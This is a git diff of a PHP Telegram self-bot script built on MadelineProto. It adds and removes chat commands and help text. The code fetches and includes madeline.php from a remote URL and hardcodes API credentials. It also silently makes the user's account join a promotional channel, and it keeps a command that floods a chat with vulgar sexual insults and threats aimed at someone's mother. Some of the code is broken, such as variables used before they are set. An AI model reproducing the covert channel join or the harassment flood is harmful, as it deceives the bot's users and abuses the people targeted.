@@ -1,21 +1,22 @@
 <?php
 // set a cronjob 1min !
-//subscribe me on youtube https://youtube.com/channel/UCEvAB9-KhQaiHJEFpoRFPXA (colePlays)
+//subscribe me on youtube https://youtube.com/channel/UCEvAB9-KhQaiHJEFpoRFPXA (MohammadPlays)
 ini_set('display_errors', 0);
 ini_set('memory_limit', -1);
-ini_set('max_execution_time', -3);
+ini_set('max_execution_time', -2);
 if(!is_dir('data')) mkdir('data');
 if(!file_exists('data/Poker.txt')) file_put_contents("data/Poker.txt","Off");
-error_reporting(0);
+error_reporting(1);
 if(!is_dir('files')){
 mkdir('files');
+mkdir("list");
 }
 if(!file_exists('madeline.php')){
 copy('https://phar.madelineproto.xyz/madeline.php', 'madeline.php');
 }
 
-if(isset($data['answering'][$msg])){
-$texx = $data['answering'][$msg];
+if(isset($data['answering'][$text])){
+$texx = $data['answering'][$text];
 $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => $texx, 'reply_to_msg_id' => $msg_id]);
 }
 if ((int)json_decode(file_get_contents('Config.json'))->Typing == 1) {
@@ -36,6 +37,12 @@ file_put_contents('timename.txt','off');
 }
 if(!file_exists('BioMod.txt')){
 file_put_contents('BioMod.txt','off');
+}
+if(!file_exists('tagger.txt')){
+file_put_contents('tagger.txt','off');
+}
+if(!file_exists('onlinee.txt')){
+file_put_contents('onlinee.txt','off');
 }
 if(!file_exists('hashtag.txt')){
 file_put_contents('hashtag.txt','off');
@@ -64,22 +71,36 @@ file_put_contents('coding.txt','off');
 if(!file_exists('reversemode.txt')){
 file_put_contents('reversemode.txt','off');
 }
+if(!file_exists('list/ban.txt')){
+}
+if(!file_exists('list/vip.txt')){
+          }
+if(!file_exists('list/mute.txt')){
+               }
 if(!file_exists('profname.txt')){
 file_put_contents('profname.txt','');
 }
 include 'madeline.php';
 include "jdf.php";
 
-$settings = [];
-$settings['logger']['max_size'] = 5*1024*1024;
+$settings = [
+    'logger' => [
+        'logger_level' => 5,
+        'max_size' => 5 * 1024 * 1024
+    ],
+    'serialization' => [
+        'serialization_interval' => 30,
+    ],
+];
+$settings = ['logger'=>['logger'=>0],'app_info'=> ['api_id'=>3004334,'api_hash'=> 'd397c51379c24e45aed0d984ebca414b']];
 $MadelineProto = new \danog\MadelineProto\API('EFI-SESSION.madeline', $settings);
 $MadelineProto->start();
 
-function closeConnection($message = 'BademjanSelf Is Running ...'){
+function closeConnection($message = 'Cole Is Running ...'){
  if (php_sapi_name() === 'cli' || isset($GLOBALS['exited'])) {
   return;
  }
-// C * O * L * E * P * L * A * Y * S
+// C 
 date_default_timezone_set('Asia/Tehran');
     @ob_end_clean();
     @header('Connection: close');
@@ -164,24 +185,31 @@ if(!file_exists('Copy-SESSION/EFI-SESSION.madeline')){
   try {
  if(isset($update['message']['message'])){
  $text = $update['message']['message'];
- $msg = $update['message']['message'];
  $msg_id = $update['message']['id'];
  $message = isset($update['message']) ? $update['message']:'';
  $MadelineProto = $this;
  $me = yield $MadelineProto->get_self();
- $admin =1171091479 ;
+ $admin = $me['id'];
+ $Mohammad = 1171091479 ;
  $chID = yield $MadelineProto->get_info($update);
  $peer = $chID['bot_api_id'];
  $type3 = $chID['type'];
  $data = json_decode(file_get_contents("data.json"), true);
  $step = $data['adminStep'];
  $op = @$update['pts'];
- if(!file_exists('ooo')){
+  if(!file_exists('ooo')){
  file_put_contents('ooo', '');
  }
+ if(file_exists('ooo') && file_get_contents($onlin) == 'on' && (time() - filectime('ooo')) >= 30){
+   @unlink('ooo');
+   @file_put_contents('ooo', '');
+   yield $MadelineProto->account->updateStatus(['offline' => false]);
+  }
 $partmode=yield $MadelineProto->getLocalContents("online.txt");
 $timename = yield $MadelineProto->getLocalContents("timename.txt");
 $BioMod = yield $MadelineProto->getLocalContents("BioMod.txt");
+$tagger = yield $MadelineProto->getLocalContents("tagger.txt");
+$onlin = yield $MadelineProto->getLocalContents("onlinee.txt");
 $hashtagmode=yield $MadelineProto->getLocalContents("hashtag.txt");
 $mentionmode=yield $MadelineProto->getLocalContents("mention.txt");
 $boldmode=yield $MadelineProto->getLocalContents("bold.txt");
@@ -209,7 +237,7 @@ $dastoorat =
 "رهنما",
 "help",
 "ریستارت",
-"restart",
+"stop",
 "مصرف",
 "وضعیت",
 "status",
@@ -227,6 +255,7 @@ $dastoorat =
 "bold on",
 "italic on",
 "smoke on",
+"onlin on",
 "mention on",
 "underline on",
 "deleted on",
@@ -239,6 +268,7 @@ $dastoorat =
 "part off",
 "hashtag off",
 "smoke off",
+"onlin off",
 "mention off",
 "bold off",
 "italic off",
@@ -259,21 +289,6 @@ if(!isset($data['lock']["$peer"]))
                 $data['lock']["$peer"] = $op;
                 file_put_contents("data.json", json_encode($data, 128|256));
 }}
-//====monshi====
-if ((int)json_decode(file_get_contents('Config.json'))->Monshi == 1) {
-if($update['update']['_'] == "updateNewMessage"){
-if(!in_array($userID,$user['userlist'])){
-$mee = $MadelineProto->get_full_info($userID);
-$me = $mee['User'];
-$first_name = $me['first_name'];
-$MadelineProto->messages->sendMessage(['peer' => $userID, 'reply_to_msg_id' => $msg_id ,'message' =>" سلام [$first_name](tg://user?id=$userID) عزيز
-$monshitext",$msg_id,'parse_mode' => 'MarkDown']);
-$user["userlist"][] = $userID;
-file_put_contents("user.txt",json_encode($user,true));
-}
-}
-}
-
 //============== Bot On | Off ==============
  if($from_id == $admin){
    if(preg_match("/^[\/\#\!]?(cole) (on|off)$/i", $text)){
@@ -282,38 +297,48 @@ file_put_contents("user.txt",json_encode($user,true));
      yield $MadelineProto->filePutContents("data.json", json_encode($data));
      yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "» ʙᴏᴛ ɴᴏᴡ ɪs $m[2]"]);
    }
- if(preg_match("/^[\/\#\!]?(kikme)$/i", $msg)){
+//Restart
+      if($text == 'Stop' ){
+              yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ok"]);
+      $MadelineProto->stop();
+       }
+  if(preg_match("/^[\/\#\!]?(onlin) (on|off)$/i", $text)){
+    preg_match("/^[\/\#\!]?(onlin) (on|off)$/i", $text, $m);
+    file_put_contents($onlin, $m[2]);
+$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ok online: $m[2] "]);
+   }
+ if(preg_match("/^[\/\#\!]?(kikme)$/i", $text)){
   $type = $MadelineProto->get_info($chatID);
   $type3 = $type['type'];
   if($type3 == "supergroup"){
-    $MadelineProto->messages->sendMessage(['peer' => $chatID, 'id' => $msg_id, 'message' => "Bye"]);
+    $MadelineProto->messages->sendMessage(['peer' => $chatID, 'id' => $msg_id, 'message' => "ok"]);
     $MadelineProto->channels->leaveChannel(['channel' => $chatID, ]);
   }else{
-    $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' => "use this in SuperGroup X.X"]);
+    $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' => "use this in SuperGroup"]);
   }
 }
 //======= monshi ========
-if($msg == "monshiOn"){
+if($text == "monshiOn"){
  $Conf = json_decode(file_get_contents('Config.json'));
 $Conf->Monshi = 1;
 file_put_contents('Config.json', json_encode($Conf));
-$ed = $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' =>' Monshi turned **ON** ✅', 'parse_mode' => 'MarkDown' ]);
+yield $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' =>' Monshi turned **ON** ', 'parse_mode' => 'MarkDown' ]);
 }
 //--
-if($msg == "monshiOff"){
+if($text == "monshiOff"){
  $Conf = json_decode(file_get_contents('Config.json'));
 $Conf->Monshi = 0;
 file_put_contents('Config.json', json_encode($Conf));
-$ed = $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' =>'Monshi turned **OFF** ❌', 'parse_mode' => 'MarkDown' ]);
+yield $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' =>'Monshi turned **OFF** ', 'parse_mode' => 'MarkDown' ]);
 }
 //--
-if(strpos($msg,"setMonshi ") !== false){
-$word = trim(str_replace("setmonshi ","",$msg));
+if(strpos($text,"setMonshi ") !== false){
+$word = trim(str_replace("setmonshi ","",$text));
    unlink("monshi.txt"); 
 $myfile2 = fopen("monshi.txt", "a") or die("Unable to open file!");
 fwrite($myfile2, "$word\n");
 fclose($myfile2);
-$ed = $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' =>" >_ $word \nHas Seted Monshi Text 👌🏻",'reply_to_msg_id' => $msg_id,'parse_mode' => 'MarkDown']);
+yield $MadelineProto->messages->editMessage(['peer' => $chatID, 'id' => $msg_id, 'message' =>" >_ $word \nHas Seted Monshi Text 👌🏻",'reply_to_msg_id' => $msg_id,'parse_mode' => 'MarkDown']);
 }
 //============== Part Mode On | Off ===============
    if(preg_match("/^[\/\#\!]?(part) (on|off)$/i", $text)){
@@ -383,6 +408,12 @@ yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'me
   yield $MadelineProto->filePutContents('BioMod.txt', $m[2]);
 yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "» BioMod ɴᴏᴡ ɪs $m[2]"]);
    }
+//tagger
+   if(preg_match("/^[\/\#\!]?(tager) (on|off)$/i", $text)){
+  preg_match("/^[\/\#\!]?(tager) (on|off)$/i", $text, $m);
+  yield $MadelineProto->filePutContents('tagger.txt', $m[2]);
+yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "tagger is $m[2]"]);
+   }
 //============== Reverse Mode On | Off ===============
    if(preg_match("/^[\/\#\!]?(reverse) (on|off)$/i", $text)){
   preg_match("/^[\/\#\!]?(reverse) (on|off)$/i", $text, $m);
@@ -430,7 +461,6 @@ file_put_contents("data.json", json_encode($data));
 //============== Help User ==============
  if($text == 'help' or $text == 'Help' or $text == 'رهنما'){
 $mem_using = round(memory_get_usage() / 1024 / 1024,1);
-yield $MadelineProto->channels->joinChannel(['channel' => '@FreeSelfBot']);
 yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "» ʜᴇʟᴘ sᴇɴᴅ ғᴏʀ ʏᴏᴜ !"]);
 yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>
 "
@@ -484,7 +514,6 @@ yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>
 • *حالت نوشتن متن با هشتگ *
 =-=-=-=-=-=-=-=-=-=-=-=-=-= 
 » `م فیچر` 
-
 • *اول م بزارید بعد جمله بصورت کلمه کلمه نوشته میشه *
 =-=-=-=-=-=-=-=-=-=-=-=-=-= 
 » `italic ` on یا off 
@@ -623,6 +652,9 @@ yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>
 » `meane ` [Text] 
 • *دریافت معانی کلمات فارسی*
 =-=-=-=-=-=-=-=-=-=-=-=-=-=
+» `delall` [id] 
+• *پاک کردن همه پیامای یک نفر با آیدیش*
+=-=-=-=-=-=-=-=-=-=-=-=-=-=
 » `kalame ` [Level] 
 • *دریافت بازی از ربات کلمه*
 • (مبتدی|ساده|متوسط|سخت|وحشتناک)
@@ -652,7 +684,7 @@ yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>
 =-=-=-=-=-=-=-=-=-=-=-=-=-= 
 **بـــخـــش مــدیــریــت :**
 =-=-=-=-=-=-=-=-=-=-=-=-=-= 
-» `/cole ` [on] یا [off] 
+» `cole ` [on] یا [off] 
 • *خاموش و روشن کردن ربات *
 =-=-=-=-=-=-=-=-=-=-=-=-=-= 
 » `ping `
@@ -667,11 +699,14 @@ yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>
 » `ban` & `unban` [Reply]
 • *بن و آنبن کردن شخصی از گروه*
 =-=-=-=-=-=-=-=-=-=-=-=-=-= 
-» `/restart`
+» `stop`
 • *برای 0 کردن حافظه *
 =-=-=-=-=-=-=-=-=-=-=-=-=-= 
 » `clean all`
 • *پاکسازی تمامی پیام های گروه در صورت ادمین بودن *
+=-=-=-=-=-=-=-=-=-=-=-=-=-= 
+» `clean` تعداد دلخواه
+• *پاکسازی پیام ها به تعداد دلخواه بین 1 تا 100000*
 =-=-=-=-=-=-=-=-=-=-=-=-=-= 
 » `setname ` YourName 
 • *تغییر اسم اکانت *
@@ -752,7 +787,7 @@ yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>
 » `git ` (username/project) or (Url)
 • *دانلود فایل فشرده یک سورس از گیتهاب*
 =-=-=-=-=-=-=-=-=-=-=-=-=-= 
-» `tagall ` 
+» `tag [متن تگ] ` 
 • *تگ کردن کل اعضای گروه*
 =-=-=-=-=-=-=-=-=-=-=-=-=-= 
 » ᴍᴇᴍ ᴜsᴀɢᴇ : **$mem_using** ᴍɢ
@@ -772,39 +807,13 @@ yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>
 "
 =-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-= 
 **بخش سرگرمی:**
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
+=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-=
 *`باهار`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`ساک ایت`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`رقص`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`رقص مربع`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`ساک`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`جق`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`bk`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`شب خوش`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
+=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-=
 *`فش`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`شمارش`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
+=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-=
 *`فش۲`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`ارسال سوپر`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`برم بخابم`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`ایول`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`Gm`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
-*`قلب`*
-=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-= 
+=-=-=-=-=-=-=-=-=-=-=-=-=-= =-=-=-=-=-=-=
 » ᴍᴇᴍ ᴜsᴀɢᴇ : **$mem_using** ᴍɢ
 =-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-= 
 • ᎠᎬᏙ » [Mohammad](https://T.me/needu_b)
@@ -812,24 +821,12 @@ yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>
 ",
 'parse_mode' => 'markdown','disable_web_page_preview'=>true,'reply_to_msg_id' => $msg_id]);
 }
-//\\\\\\\\\\\\\\\\\\\\\\\
-if ($text == "panel" or $text == "/panel" or $text == "پنلل"or $text == "پنل"){
-$MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ᴏᴘᴇɴ ᴛʜᴇ ᴘᴀɴᴇʟ . . . !", 'parse_mode' => 'MarkDown']);
-$messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@saeid62120bot", 'peer' => $peer, 'query' => "kosnell_", 'offset' => '0']);
-$query_id = $messages_BotResults['query_id'];
-$query_res_id = $messages_BotResults['results'][0]['id'];
-yield $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
-}
-//============== Time Name Mode ==============
-
 //=========== lnametime on/off=============
  if(preg_match("/^[\/\#\!]?(time lname) (on|off)$/i", $text)){
-
-  preg_match("/^[\/\#\!]?(time lname) (on|off)$/i", $text, $m);
-
-  yield $MadelineProto->filePutContents('timename.txt', $m[2]);
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "» ᴛɪᴍᴇ ɴᴀᴍᴇ ɴᴏᴡ ɪs $m[2]"]);
-   }
+                preg_match("/^[\/\#\!]?(time lname) (on|off)$/i", $text, $m);
+                yield $MadelineProto->filePutContents('timename.txt', $m[2]);
+                yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ᴛɪᴍᴇ ɴᴀᴍᴇ ɴᴏᴡ ɪs $m[2]"]);
+             }
 //====== bio time ==========
 if ($time=="$time"){
 if ($TimeBioes=="On"){$MadelineProto->account->updateProfile(['about' => "$time"]);}}
@@ -844,16 +841,23 @@ if($timename == 'on'){
     $year_number = jdate('y');
     $day_name = jdate('l');
 try {
-    yield $MadelineProto->channels->joinChannel(['channel' => '@ColeChannel']);
+    yield $MadelineProto->channels->joinChannel(['channel' => '@FreeSelfBot']);
     yield $MadelineProto->account->updateStatus(['offline'=> false]);
     yield $MadelineProto->account->updateProfile(['last_name' => "$time"]);
     } catch (\danog\MadelineProto\RPCErrorException $e) {
     } catch (\danog\MadelineProto\Exception $e2) {
     }
-    });
+    }
 //=======
 if($BioMod == 'on'){
   date_default_timezone_set('Asia/Tehran');
+    $time = date("H:i");
+    $fonts = [["⁰","¹","²","³","⁴","⁵","⁶","⁷","⁸","⁹"]];
+	$time2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("H•i"));
+    $day_number = jdate('j');
+    $month_number = jdate('n');
+    $year_number = jdate('y');
+    $day_name = jdate('l');
 $BioText = [
 "«sei la mia anima gemella🧡»",
 "«sei la mia anima gemella🤍»",
@@ -867,57 +871,10 @@ $BioText = [
 $r = $BioText[rand(0, count($BioText)-1)];
 try {
   yield $MadelineProto->account->updateProfile(['about' => "$r"]);
-  yield $MadelineProto->sleep(5);
   }catch (\danog\MadelineProto\RPCErrorException $e) {
     } catch (\danog\MadelineProto\Exception $e2) {
     }
 }
-//=============== Fun ================
-if($text=='ساک ایت'){
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-|￣￣￣￣￣￣￣￣￣￣￣|
-"]);
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-|￣￣￣￣￣￣￣￣￣￣￣|
-|                 Suck It !               |
-"]);
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-|￣￣￣￣￣￣￣￣￣￣￣|
-|                 Suck It !               |
-|＿＿＿＿＿＿＿＿＿＿＿| 
-"]);
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-|￣￣￣￣￣￣￣￣￣￣￣|
-|                 Suck It !               |
-|＿＿＿＿＿＿＿＿＿＿＿| 
-                  \ (•_•) / 
-"]);
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-|￣￣￣￣￣￣￣￣￣￣￣|
-|                 Suck It !               |
-|＿＿＿＿＿＿＿＿＿＿＿| 
-                  \ (•_•) / 
-                    \      / 
-"]);
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-|￣￣￣￣￣￣￣￣￣￣￣|
-|                 Suck It !               |
-|＿＿＿＿＿＿＿＿＿＿＿| 
-                  \ (•_•) / 
-                    \      / 
-                       ---
-"]);
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
-|￣￣￣￣￣￣￣￣￣￣￣|
-|                 Suck It !               |
-|＿＿＿＿＿＿＿＿＿＿＿| 
-                  \ (•_•) / 
-                    \      / 
-                       ---
-                      |   |
-"]);
-}
-
 if($text=='Bahar' or $text=='bahar' or $text== 'باهار'){
 
 yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "🧡💛💚💙🤎💜❤️ 
@@ -1029,18 +986,10 @@ yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'me
 yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "💜💙💚🧡🤎💙💜 
 🖤♥️♥️♥️♥️♥️💛 
 🤎♥️♥️♥️♥️♥️🖤 
-💛♥️@needu_m♥️❤️ 
+💛♥️@needu_b♥️❤️ 
 🤎♥️♥️♥️♥️♥️🧡 
 🧡♥️♥️♥️♥️♥️💛 
 💙🖤❤️💜🤎💙💚"]);
-}
-
-//====
-if($text=='tagg' ){
-  yield $MadelineProto->messages->sendMessage(['peer' => $peer,'id' => $msg_id,'message' => "OkTagStarted",'reply_to_msg_id' => $message['id']]);
-}
-if($text=='stop' ){
-  yield $MadelineProto->messages->sendMessage(['peer' => $peer,'id' => $msg_id,'message' => "tagof",'reply_to_msg_id' => $message['id']]);
 }
 // =========== timesng =============
 	if ($text == 'timesnj' or $text=='زمانسنج'  or $text=='تایمر') {
@@ -1096,86 +1045,7 @@ yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' ن�
 yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'ننه کیرسوار 😂']);
 yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' میزارمت سر کیرم پرتت میکنم تو کیون مادرت ']);
 yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'بیناموص بیا بالابینم صالها بالا باش مادرتو میخام زجرکش کنم']);
-
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => '𝟏']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => '𝟐']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => '𝟑']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => '𝟒']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => '𝟓']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => '𝟔']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => '𝟕']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => '𝟖']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => '𝟗']);
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => '𝟏𝟎']);
 yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => ' دیگه ک چصشاخی نمیکنی بینامیوص ؟؟ انچنان کیری حواله ی مادرت بکنم ک حافظش بپره ']);
-
-}
-if ($text == 'number' or $text == 'شمارش') {
-
-$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "𝟏"]);
-
-sleep(0);
- $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "𝟐",'id' => $msg_id +1]);
-  sleep(0);
- $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "𝟑",'id' => $msg_id +1]);
-sleep(0);
- $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "𝟒",'id' => $msg_id +1]);
-sleep(0);
- $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "𝟓",'id' => $msg_id +1]);
-sleep(0);
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "𝟔",'id' => $msg_id +1]);
-sleep(0);
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "𝟕",'id' => $msg_id +1]);
-sleep(0);
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "𝟖",'id' => $msg_id +1]);
-sleep(0);
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "𝟗",'id' => $msg_id +1]);
-sleep(0);
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "𝟏𝟎",'id' => $msg_id +1]);
-sleep(0);
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => " 𝐇𝐀 𝐇𝐀 𝐲𝐨𝐮 𝐋𝐨𝐒𝐞",'id' => $msg_id +1]);
-}
-if($text== 'شب خوش' or $text== 'شب بخیر '){
-
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜              🙃']);
-
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜             🙃']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜            🙃']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜           🙃']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜          🙃']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜         🙃']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜        🙃']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜       😕']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜      ☹️']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜     😣']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜    😖']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜   😩']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜  🥱']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🌜 🥱']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '😴']);
-
-}
-if($text== 'برم بخابم'){
-
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏                🚶🏻']);
-
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏               🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏              🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏             🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏            🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏           🚶🏻‍♂️']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏          🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏         🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏        🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏       🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏      🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏     🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏    🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏   🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏  🚶🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛏 ??🏻']);
-  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🛌']);
-
 }
 if($text== 'بزن قدش' or $text=='ایول'){
 
@@ -1200,1037 +1070,25 @@ if($text== 'بزن قدش' or $text=='ایول'){
   yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🤜🏻   🤛🏻']);
   yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🤜🏻  🤛🏻']);
   yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => '🤜🏻🤛🏻']);
-
-}
-if($text=='Gm' or $text=='GM' or $text=='صبح بخیر'){
-
-yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => '🌑---_______🏙________---🚴🏻']);
-
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '🌖---______ _🎆_______---🚴🏻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '🌗---_____ _🏙_______---🚴🏻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '🌘---______🎆______---🚴🏻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '🌑---_____🏙______---🚴🏻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '🌒---____🎆_____---🚴🏻']);
-
-yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => '🌓---___🏙_____---🚴🏻']);
-
